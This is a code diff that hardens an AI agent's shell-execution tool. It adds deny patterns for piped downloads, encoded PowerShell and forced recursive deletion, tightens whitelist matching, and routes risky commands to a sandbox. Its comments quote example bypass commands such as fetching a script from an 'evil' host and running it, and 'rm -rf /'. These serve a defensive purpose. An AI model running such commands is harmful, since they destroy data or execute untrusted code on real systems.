@@ -13,6 +13,7 @@ import logging
 import os
 import platform
 import re
+import shlex
 import signal
 import subprocess
 from pathlib import Path
@@ -23,6 +24,7 @@ from pydantic import BaseModel, Field
 
 from Django_xm.apps.tools.base import AsyncToolMixin
 from Django_xm.apps.tools.errors import TOOL_VERSION, StandardToolResult, ToolStatus
+from Django_xm.common.risk_levels import RiskLevel
 
 logger = logging.getLogger(__name__)
 
@@ -116,6 +118,13 @@ BLOCKED_PATTERNS: list[str] = [
     # 危险脚本下载执行
     r"\bcurl\s+.*\|\s*(bash|sh|python|pwsh)",
     r"\bwget\s+.*\|\s*(bash|sh|python|pwsh)",
+    # PowerShell 编码执行（pwsh 变体：-enc/-e/-EncodedCommand 可混入其他 flag）
+    r"\bpwsh\s+(?:-{1,2}\S+\s+)*-e(?:nc|ncodedcommand)?\b",
+    # bash/sh -c 任意命令执行
+    r"\b(?:ba)?sh\s+-c\b",
+    # rm 分体 flag 形态（rm -r -f / rm --recursive -f / rm --force）
+    r"\brm\s+(?:-{1,2}[a-zA-Z]+\s+)+-{1,2}[a-zA-Z]*f[a-zA-Z]*\b",
+    r"\brm\s+(?:-{1,2}[a-zA-Z]+\s+)*--force\b",
     # Windows 特有危险命令
     r"\bdiskpart\b",
     r"\bbcdedit\b",
@@ -227,65 +236,62 @@ def _is_command_blocked(command: str) -> str | None:
     return None
 
 
-# 重定向/管道操作符检测模式：单词白名单命令携带这些操作符时需走审批
-# 防止 "echo bad > /etc/passwd" / "cat file | rm -rf /" 等绕过攻击
-_REDIRECT_PIPE_PATTERN = re.compile(
-    r"(?<!\w)(?:"
-    r">{1,2}|<{1,2}|"  # 重定向: > >> < <<
-    r"\|"  # 管道: |
-    r")(?:\s|$)",
-    re.DOTALL,
-)
+# 拼接/替换/重定向/管道操作符检测模式：白名单命令携带任一符号即视为非安全，
+# 强制走审批，防止以下绕过攻击（S-01）：
+# - 命令拼接: "curl http://evil -o /tmp/s; bash /tmp/s.sh" / "echo ok && evil" / "echo ok & evil"
+# - 短路拼接: "curl http://x || evil"
+# - 命令替换: "echo $(evil)" / "echo `evil`"
+# - 重定向/管道: "echo bad > /etc/passwd" / "cat file | rm -rf /"
+# - 换行拼接: "echo ok\nevil"（cmd.exe/bash 均将换行视为命令分隔符）
+_SHELL_COMPOSITION_PATTERN = re.compile(r"[;|&<>`\n\r]|\$\(")
 
 
-def _has_redirect_or_pipe(command: str) -> bool:
-    """检测命令是否包含重定向或管道操作符
+def _has_shell_composition(command: str) -> bool:
+    """检测命令是否包含拼接/替换/重定向/管道符号
 
-    单词白名单命令（如 echo/pandoc）携带重定向/管道时可执行任意后续命令，
+    白名单命令（如 echo/curl/pandoc）携带任一此类符号时均可构造任意命令执行，
     必须强制走审批流程，不允许直接执行。
 
     Returns:
-        True 表示命令包含重定向/管道操作符
+        True 表示命令包含拼接/替换/重定向/管道符号
     """
-    return bool(_REDIRECT_PIPE_PATTERN.search(command))
+    return bool(_SHELL_COMPOSITION_PATTERN.search(command))
+
+
+def _tokenize_command(command: str) -> list[str] | None:
+    """shlex 分词（白名单严格首词匹配依据）
+
+    Returns:
+        分词结果列表；引号不配对等解析失败返回 None（fail-closed，按非白名单处理）
+    """
+    try:
+        return shlex.split(command)
+    except ValueError:
+        return None
 
 
 def _is_command_whitelisted(command: str) -> bool:
-    """检查命令是否在白名单中
+    """检查命令是否在白名单中（严格匹配，fail-closed）
 
-    匹配规则：
-    - 多词白名单命令（如 "git status"）：完整前缀匹配
-    - 单词白名单命令（如 "pandoc"）：分词后第一个词匹配，且命令不含重定向/管道
-      操作符（携带 > >> < << | 时强制走审批，防止 "echo bad > /etc/passwd" 等
-      绕过攻击）
+    白名单放行必须同时满足：
+    1. 命令不含任何拼接/替换/重定向/管道符号（; && & || | > >> < << $( ` 换行）
+    2. shlex 分词后前导词严格命中白名单条目：
+       - 单词条目（如 "curl"）：首词全等
+       - 多词条目（如 "git status"）：前 N 个词全等
+       防止白名单命令名出现在参数位置或经子串误判放行（S-01）
+    任一不满足 → 返回 False（走既有审批路径，不自动放行）
     """
-    whitelist = _get_whitelist_commands()
-    cmd_stripped = command.strip()
-
-    if not cmd_stripped:
+    if _has_shell_composition(command):
         return False
 
-    # 精确匹配
-    for wl_cmd in whitelist:
-        if cmd_stripped == wl_cmd:
-            # 单词命令精确匹配时仍需检查重定向/管道
-            # （虽无参数，但保持一致性）
-            return not (" " not in wl_cmd and _has_redirect_or_pipe(cmd_stripped))
+    tokens = _tokenize_command(command)
+    if not tokens:
+        return False
 
-    cmd_first_word = cmd_stripped.split()[0] if cmd_stripped.split() else ""
-    for wl_cmd in whitelist:
-        wl_first_word = wl_cmd.split()[0]
-        # 白名单命令本身包含空格（如 "git status"），需要完整前缀匹配
-        if " " in wl_cmd:
-            if cmd_stripped.startswith(wl_cmd + " ") or cmd_stripped == wl_cmd:
-                # 多词白名单命令也检查重定向/管道，防止
-                # "git status > /etc/passwd" 等绕过
-                return not _has_redirect_or_pipe(cmd_stripped)
-        # 单词白名单命令：仅当第一个词匹配且无重定向/管道时放行
-        elif cmd_first_word == wl_first_word:
-            # 携带重定向/管道的单词命令必须走审批
-            return not _has_redirect_or_pipe(cmd_stripped)
-
+    for wl_cmd in _get_whitelist_commands():
+        wl_tokens = wl_cmd.split()
+        if tokens[: len(wl_tokens)] == wl_tokens:
+            return True
     return False
 
 
@@ -430,6 +436,20 @@ def _sandbox_result_to_standard(sandbox_result, command: str) -> StandardToolRes
     )
 
 
+def _assess_command_risk_level(command: str) -> RiskLevel:
+    """复用审批策略评估命令风险等级（沙箱路由依据，S-02）
+
+    与 ApprovalMiddleware 的判定同源（ShellExecApprovalPolicy.assess_risk），
+    保证沙箱路由与审批展示的风险等级一致。
+    注意：不含子 agent 风险加权（工具层无 subagent 上下文），
+    子 agent 中被上调为 HIGH 的命令由高危子串模式兜底强制沙箱。
+    """
+    # 延迟导入避免循环依赖（policies.assess_risk 内部同样延迟导入本模块）
+    from Django_xm.apps.agent_hub.approval.policies import ShellExecApprovalPolicy
+
+    return ShellExecApprovalPolicy().assess_risk({"command": command})
+
+
 def _execute_command(
     command: str,
     timeout: int = DEFAULT_TIMEOUT,
@@ -449,18 +469,27 @@ def _execute_command(
     超时后通过 _kill_process_tree 终止整个进程树，
     解决 Windows shell=True 下子进程不被杀导致管道挂起的问题。
     """
-    # Phase D: HIGH 级命令沙箱路由（任务级开关判定）
+    # 风险等级：复用审批策略判定（与 ApprovalMiddleware 同源），
+    # 作为沙箱路由阶梯依据（HIGH 强制沙箱 / controlled 进容器 / safe 本机）
+    risk_level = _assess_command_risk_level(command)
+
+    # Phase D: 沙箱路由（risk_level 阶梯 + 任务级开关，fail-closed）
     try:
         from Django_xm.common.sandbox import sandbox_executor
 
-        if sandbox_executor.should_sandbox(command, enable_sandbox=enable_sandbox):
+        if sandbox_executor.should_sandbox(
+            command, risk_level=risk_level, enable_sandbox=enable_sandbox
+        ):
             effective_timeout = min(_get_effective_timeout(command, timeout), MAX_TIMEOUT)
             safe_cwd = _get_safe_working_dir(working_dir)
             sandbox_result = sandbox_executor.execute(
                 command,
                 working_dir=safe_cwd,
                 timeout=effective_timeout,
-                enable_sandbox=enable_sandbox,
+                risk_level=risk_level,
+                # 路由已判定必须进沙箱（HIGH 强制 / controlled 已开任务开关），
+                # 此处固定 True：防止 execute 的任务级开关守卫把 HIGH 命令落回本机
+                enable_sandbox=True,
                 thread_id=thread_id,
             )
             # 沙箱执行指标已在 SandboxExecutor.execute() 出口统一记录（单一数据源），
@@ -611,7 +640,8 @@ class ShellExecTool(AsyncToolMixin, BaseTool):
         "参数：command-要执行的命令（必填），timeout-超时秒数（默认60），working_dir-工作目录（默认当前目录）。"
         "安全策略：白名单命令（agent-browser、pandoc、python manage.py、git status 等）直接执行；"
         "非白名单命令（含 python/node/npx 等可执行任意代码的解释器）需走审批流程；"
-        "携带重定向/管道的命令强制走审批（防止 echo bad > /etc/passwd 等绕过）；"
+        "携带拼接/替换/重定向/管道符号（; && || | > < $( ` 换行）的命令强制走审批"
+        "（防止 curl x; bash s.sh、echo $(evil) 等绕过）；"
         "危险命令（rm -rf、shutdown 等）始终拒绝。"
     )
     args_schema: type[BaseModel] = ShellExecInput
